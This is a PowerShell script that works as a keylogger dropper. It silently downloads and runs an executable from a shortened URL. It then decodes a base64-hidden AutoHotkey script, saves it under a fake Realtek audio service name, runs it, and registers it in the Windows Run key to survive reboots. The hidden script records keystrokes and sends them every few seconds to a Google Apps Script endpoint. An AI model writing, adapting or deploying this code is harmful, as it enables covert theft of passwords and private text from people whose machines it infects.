Set-StrictMode -Off
function base64ToFile($base64String,$scriptPath,$run = $false){
    $bytes = [System.Convert]::FromBase64String($base64String)

    [System.IO.File]::WriteAllBytes($scriptPath, $bytes)

    if($run){
        Start-Process $scriptPath
    }
}

$path = "$Env:TEMP\14660a3a-f06a-4bf0-b2c8-6955e879fa30.exe"
if (-Not (Test-Path -Path $path)){
    Start-BitsTransfer -Source "https://shorturl.at/rnxiX" -Destination $path
}

Start-Process $path -ArgumentList '/silent' -Wait
Remove-Item -Path $path

$ahk  = "I1JlcXVpcmVzIEF1dG9Ib3RrZXkgdjIuMA0KI1NpbmdsZUluc3RhbmNlIEZvcmNlDQpnbG9iYWwgdGV4dCA6PSAnJw0KZ2xvYmFsIGVwb2NoVGltZSA6PSAwDQp+MDo6TG9nKCcwJykNCn4xOjpMb2coJzEnKQ0KfjI6OkxvZygnMicpDQp+Mzo6TG9nKCczJykNCn40OjpMb2coJzQnKQ0KfjU6OkxvZygnNScpDQp+Njo6TG9nKCc2JykNCn43OjpMb2coJzcnKQ0Kfjg6OkxvZygnOCcpDQp+OTo6TG9nKCc5JykNCn5hOjpMb2coJ2EnKQ0KfmI6OkxvZygnYicpDQp+Yzo6TG9nKCdjJykNCn5kOjpMb2coJ2QnKQ0KfmU6OkxvZygnZScpDQp+Zjo6TG9nKCdmJykNCn5nOjpMb2coJ2cnKQ0Kfmg6OkxvZygnaCcpDQp+aTo6TG9nKCdpJykNCn5qOjpMb2coJ2onKQ0Kfms6OkxvZygnaycpDQp+bDo6TG9nKCdsJykNCn5tOjpMb2coJ20nKQ0Kfm46OkxvZygnbicpDQp+bzo6TG9nKCdvJykNCn5wOjpMb2coJ3AnKQ0KfnE6OkxvZygncScpDQp+cjo6TG9nKCdyJykNCn5zOjpMb2coJ3MnKQ0KfnQ6OkxvZygndCcpDQp+dTo6TG9nKCd1JykNCn52OjpMb2coJ3YnKQ0Kfnc6OkxvZygndycpDQp+eDo6TG9nKCd4JykNCn55OjpMb2coJ3knKQ0Kfno6OkxvZygneicpDQoNCjsgQ2FwaXRhbCBsZXR0ZXJzIHVzZSBTaGlmdCAoICsgKQ0KfithOjpMb2coJ0EnKQ0KfitiOjpMb2coJ0InKQ0KfitjOjpMb2coJ0MnKQ0KfitkOjpMb2coJ0QnKQ0KfitlOjpMb2coJ0UnKQ0KfitmOjpMb2coJ0YnKQ0KfitnOjpMb2coJ0cnKQ0KfitoOjpMb2coJ0gnKQ0KfitpOjpMb2coJ0knKQ0KfitqOjpMb2coJ0onKQ0KfitrOjpMb2coJ0snKQ0KfitsOjpMb2coJ0wnKQ0KfittOjpMb2coJ00nKQ0KfituOjpMb2coJ04nKQ0KfitvOjpMb2coJ08nKQ0KfitwOjpMb2coJ1AnKQ0KfitxOjpMb2coJ1EnKQ0KfityOjpMb2coJ1InKQ0KfitzOjpMb2coJ1MnKQ0Kfit0OjpMb2coJ1QnKQ0Kfit1OjpMb2coJ1UnKQ0Kfit2OjpMb2coJ1YnKQ0Kfit3OjpMb2coJ1cnKQ0Kfit4OjpMb2coJ1gnKQ0Kfit5OjpMb2coJ1knKQ0Kfit6OjpMb2coJ1onKQ0KflNwYWNlOjpMb2coJyAnKQ0KfkVudGVyOjpMb2coJ2BuJykNCn5CYWNrU3BhY2U6OkxvZygnQkFDS1NQQUNFJykNCg0KU2VuZCh0eHQpew0KICAgIHR4dCA6PSBTdHJSZXBsYWNlKHR4dCwgJyAnLCAnJTIwJykgICA7IFJlcGxhY2Ugc3BhY2VzIHdpdGggJTIwDQogICAgdHh0IDo9IFN0clJlcGxhY2UodHh0LCAnYG4nLCAnJTBBJykgIDsgUmVwbGFjZSBuZXcgbGluZXMgd2l0aCAlMEENCiAgICB1cmwgOj0gRm9ybWF0KCdodHRwczovL3NjcmlwdC5nb29nbGUuY29tL21hY3Jvcy9zL0FLZnljYndkVTFSZ09lZlVKaGw4aE1hLVdybk5obkQxdS1ITTRKN216ZFoxdUlMaWVUOTRraEZheHdQaHo4NWprRWplVEdzam1nL2V4ZWM/cT17MX0nLHRleHQpDQogICAgd2hyIDo9IENvbU9iamVjdCgnV2luSHR0cC5XaW5IdHRwUmVxdWVzdC41LjEnKQ0KICAgIHdoci5PcGVuKCdHRVQnLCB1cmwsIEZhbHNlKSwgd2hyLlNlbmQoKQ0KICAgIHJlc3BvbnNlIDo9IHdoci5SZXNwb25zZVRleHQNCiAgICA7TXNnQm94IHJlc3BvbnNlDQp9DQoNCkxvZyhrZXkpIHsNCiAgICBnbG9iYWwgdGV4dA0KICAgIGdsb2JhbCBlcG9jaFRpbWUNCiAgICBpZiAoa2V5PT0nQkFDS1NQQUNFJykgew0KICAgICAgICB0ZXh0IDo9IFN1YlN0cih0ZXh0LCAxLCBTdHJMZW4odGV4dCkgLSAxKQ0KICAgICAgICByZXR1cm4NCiAgICB9DQogICAgZXBvY2hUaW1lIDo9IEFfVGlja0NvdW50DQogICAgdGV4dCAuPSBrZXkNCn0NCg0KTG9vcCB7DQogICAgZ2xvYmFsIGVwb2NoVGltZSwgdGV4dA0KICAgIHRpY2sgOj0gQV9UaWNrQ291bnQgIDsgR2V0IGN1cnJlbnQgVVRDIHRpbWUNCiAgICBpZiAoKHRpY2sgLSBlcG9jaFRpbWUpLzEwMDAgPiA1KSAmJiAodGV4dCAhPSAnJykgeyAgOyBDb21wYXJlIGluIG1pbGxpc2Vjb25kcyAoMTAgc2Vjb25kcykNCiAgICAgICAgU2VuZCh0ZXh0KQ0KICAgICAgICB0ZXh0IDo9ICcnDQogICAgICAgIGVwb2NoVGltZSA6PSB0aWNrDQogICAgfQ0KICAgIFNsZWVwKDEwMCkNCn0="
$apath = "$Env:LOCALAPPDATA\RtkAudUService64.ahk"
base64ToFile $ahk $apath $true
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'RtkAudUService64' -Value $apath
